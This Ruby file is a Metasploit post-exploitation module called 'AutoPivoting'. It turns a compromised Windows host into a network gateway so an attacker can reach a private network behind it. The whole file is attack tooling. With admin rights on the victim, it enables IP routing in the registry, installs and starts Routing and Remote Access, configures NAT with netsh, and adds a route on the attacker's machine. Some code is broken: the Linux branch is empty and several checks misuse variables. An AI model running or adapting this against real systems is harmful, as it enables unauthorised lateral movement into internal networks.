##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'AutoPivoting',
        'Description'   => %q{This module Configures the computer to be a gateway torward other network. It works with linux and windows systems.},
        'License'       => MSF_LICENSE,
        'Author'        => 
           [
             'Mikel & j4r3',
             'none <none[at]gmail.com>'
           ],
		'Platform'      => [ 'win', 'linux'],
        'SessionTypes'  => [ 'meterpreter','shell']
      ))

    register_options(
      [
		# OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ])
		OptAddressRange.new('NET',    [true, 'The network we want to arrive (Example: 10.0.0.0/24)']),
		OptAddress.new('RHOST',    [true, 'IP address of pivot computer (our side IP)']),
		OptString.new('NInt01', [true, 'Name of pivot network adapter of our network. Explample: "eth0", "Ethernet 2"...']),
		OptString.new('NInt02', [true, 'Name of pivot network adapter of the other network. Explample: "eth1", "Ethernet", "tap0"...']),
      ])
  end
  
	########################################################################################################
	####################################START_FUNCTIONS#####################################################
	########################################################################################################
	
	#
	# Get OS of PIVOT
	#
	def sistema_base?
		if (Msf::Config.local_directory[0,1])==("/")
			return "linux"
		elsif ((Msf::Config.local_directory[0,1])=~ /[[:alpha:]]/)
			return "windows"
		else
			#usamos uknown por el tipo de sistemas compatibles en el framwork
			return "unknown" 
		end
	end

	def linux_pivot()
		#
		# Linux commands
		#

	end
	
	#
	# Get the windows service status in string format
	#
	def getStatus(status)
		
		case status.to_s
		when '1'
			return 'Stoped'
		when '4'
			return 'Started'
		when '7'
			return 'Disabled'
		end
		return "Unknown status: #{status.to_s}"
	end
	
	#
	# Windows commands
	#
	def windows_pivot()

		if is_admin? or is_system?
		
			rra_info = service_info("RemoteAccess")
			rra_status = getStatus(rra_info[:status])
			key = "HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\"
			iprouting_reg_status = registry_getvalinfo(key,"IPEnableRouter")["Data"]
			win_version = session.sys.config.sysinfo['OS']
			print_status("Operating System: #{win_version}")
			print_status("Starting the proccess...")			
						
			# Common to all windows versions
			print_status("Enabling IP Router...")
			
			if iprouting_reg_status != 1
				if registry_setvaldata(key, "IPEnableRouter", "1", "REG_DWORD")
					print_good("	IP Routing is Enabled.")
				else
					print_bad("  	There was an error setting the IPEnableRouter value.")
					# Exit.
					abort("Aborting module...")
				end
			else
				print_good("	IP Routing is Enabled. It's not necessary to change the value.")
			end
			
			if win_version=~ /Windows 2008/
				if have_powershell?
					rol_status = psh_exec("Import-Module ServerManager; Get-WindowsFeature | findstr 'NPAS-RRAS-Services' | findstr '[X'")
					if rol_status == ""
						print_status("Powershell is installed in #{win_version['OS']}. Trying to install the services.")
						# Windows 2008
						psh_exec("Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services")
					else
						print_status("The services are installed. It's not necessary to install them")
					end
				else
					print_status("Powershell is not installed in #{win_version['OS']}. Trying to install from command line...")
					cmd_exec("c:\Windows\system32\ServerManagerCmd.exe -install NPAS-RRAS-Services")
				end
			elsif win_version=~ /Windows 2012/
				if have_powershell?
					rol_status = psh_exec("Import-Module ServerManager; Get-WindowsFeature | findstr 'Routing' | findstr '[X'")
					if not rol_status.include? "Installed"
						print_status("Powershell is installed in #{win_version}. Trying to install the services.")
						psh_exec("Import-Module ServerManager; Add-WindowsFeature Routing")
					else
						print_status("The services are installed. It's not necessary to install them")
					end
				else
					print_bad("Powershell is not installed in #{win_version}. For this windows version (#{win_version['OS']}) we can't continue the execution.")
					abort("Aborting module...")
				end
			elsif win_version=~ /Windows 8/ or  win_version['OS']=~ /Windows 7/ or  win_version['OS']=~ /Windows 10/
				print_bad("The system #{win_version} is not compatible with this module. The compatible systems are: Windows XP, Windows Server 2003, Windows Server 2008, windows Server 2012 and Windows Server 2016.")
			end
			
			# Common to all windows versions
			
			print_status("Configuring interfaces...")
			cmd_exec("netsh routing ip nat install")
			cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full")
			cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private")
			
			# Specific instructions for each windows version
			
			print_status("Enabling Routing and Remote Access service...")
			if rra_status == 'Started'
				print_good("The service is enabled. It's not necessary to start it.")
			else
				if win_version=~ /Windows 2012/
					cmd_exec ("sc config RemoteAccess start= auto")
					print_status("Starting Routing and Remote Access service...")
					cmd_exec("net start RemoteAccess")
					print_good("	RemoteAccess service started.")
				else
					if service_change_startup("RemoteAccess",2)
						print_good("	RemoteAccess service enabled.")
					else
						print_bad("  	There was an error enabling RemoteAccess service.")
						# Exit
						abort("Aborting module...")
					end
					print_status("Starting Routing and Remote Access service...")
					if service_start("RemoteAccess")
						print_good("	RemoteAccess service started.")
					else
						print_bad("  	There was an error starting RemoteAccess service.")
						# Exit
						abort("Aborting module...")
					end
				end			
				puts("")
			end
		else
			print_bad("You have to be administrator in the pivot machine to execute this module.")
			abort("Aborting module...")
		end
	end
	
	#
	# cidr to netmask function
	#
	def get_netmask(eval_net)
		cidr= eval_net.split("/").last
		return IPAddr.new('255.255.255.255').mask(cidr).to_s
	end
	
	#
	# check the format of parameter NET
	#
	def check_rnet()
		
		
		if get_cidr(datastore['NET']) == false or not((0..33).include?(get_cidr(datastore['NET']))) or not(Rex::Socket.is_ipv4?(get_net(datastore['NET'])))
			print_bad("You need to provide IPv4 network in NET parameter. Example: 192.168.1.0/24")
			return false
		end
		return true
	end
	
	#
	# Get network
	#
	def get_net(eval_net)
		if eval_net.include? "/"
			if eval_net.split("/").length == 2
				return eval_net.split("/").first
			end
		end
		return false
	end
	
	#
	# Get CDIR
	#
	def get_cidr(eval_net)
		if eval_net.include? "/"
			if eval_net.split("/").length == 2
				return eval_net.split("/").last.to_i
			end
		end
		return false
	end
	
	#
	# Create the route in local machine
	# 
	def create_route()
		print_status("Adding route to target network...")
		case sistema_base?
	  	when 'linux'
		  	if system("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
				print_good("Route added.")
			else
				print_bad("Something was wrong adding local route. Try to add it manually.")
				print_bad("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
			end
		when 'windows'
			if system("route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
				print_good("Route added.")
			else
				print_bad("Something was wrong adding local route. Try to add it manually")
				print_bad("route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
			end
		end
	end
	
	#
	# Get the number of interfaces, except loopback
	#
	def num_ifaces()
		iface=client.net.config.interfaces
		count=0
		iface.each do |i|
			if not (i.mac_name =~ /Loopback/ or i.mac_name =~ /lo/)
				count+=1
			end
		end
		return count
	end
	
	#
	# Get interfaces name on windows
	#
	def get_if_name(ip)
		system_ifaces = cmd_exec('ipconfig').split("\n")
		adapter_name=[]
		system_ifaces.each do |x|
			if x.include? "Ethernet"
				adapter_name=x.split(":").first
			elsif x.include? " IP" and x.include? ":"
				ip_iface = x.split(": ")
				if_ip = ip_iface.last[0..-3]
				if if_ip == ip
					return adapter_name
				end
			end
		end
		return nil
	end

	#
	# Get pivot interface name, IPobtiene los parametros de la interface del pivot, ip de la interface,netmask y nombre, si no es recuperable retorna nulo
	#
	def gw_interface() #return [remote_int,netmask,name_iface]
		local_int=session.tunnel_local.split(":").first
		# puts("ip local: #{local_int}")
		remote_int=session.tunnel_peer.split(":").first
		# puts("ip remota: #{remote_int}")
		iface=client.net.config.interfaces
		iface.each do |i|
			if not (i.mac_name =~ /Loopback/ or i.mac_name =~ /lo/)
				puts(i.mac_name)
				netmask=i.netmasks[0].to_s
				host= i.ip + "/" + netmask
				eval_net = IPAddr.new(host)
				# print_status("la net local a probar: #{host}")
				# print_status("la interface local a probar: #{local_int}")
				local_host= IPAddr.new(local_int)
				if eval_net.include?(local_host)
					netmask=i.netmasks[0].to_s																				
					remote_os=session.sys.config.sysinfo['OS']
					if remote_os =~ /Linux/
						return [i.ip,netmask,i.mac_name,eval_net.to_s]
					elsif remote_os=~ /Windows/
						if_name=get_if_name(i.ip)
						return [i.ip,netmask,if_name,eval_net.to_s]
					end
				end
			end
		end
		return nil
	end 
	
	#
	# obtiene los parametros de la r_net, ip de la interface remota,netmask, nombre y red, si no es recuperable retorna nulo
	#	
	def get_rnet()
		if num_ifaces() <= 1
			print_bad("There are not enough interfaces to establish the route.")
		elsif num_ifaces() > 2
			print_bad("There are too many interfaces, add them manualy.")
		elsif num_ifaces() == 2
			l_iface=gw_interface()[0]
			r_iface=client.net.config.interfaces
			r_iface.each do |i|
				if not(i.mac_name =~ /Loopback/ or i.mac_name =~ /lo/)
					if i.ip != l_iface
						netmask=i.netmasks[0].to_s
						iface= i.ip + "/" + netmask
						eval_net = IPAddr.new(iface)
						remote_os=session.sys.config.sysinfo['OS']
							if remote_os =~ /Linux/
								return [i.ip,netmask,i.mac_name,eval_net.to_s]
							elsif remote_os=~ /Windows/
								if_name=get_if_name(i.ip)
								return [i.ip,netmask,if_name,eval_net.to_s]
							end
					end
				 end
			end
		end
		return nil
	end 
	
	######################################################################################################
	####################################END_FUNCTIONS#####################################################
	######################################################################################################
	
	#
  	# MAIN PROGRAM
  	#
	def run

		if check_rnet()
			case session.platform
			when 'linux'
				linux_pivot()
			when 'windows'
				windows_pivot()
			end
			create_route()
		else
			print_bad("Aborting Module...")
		end
  	end
end
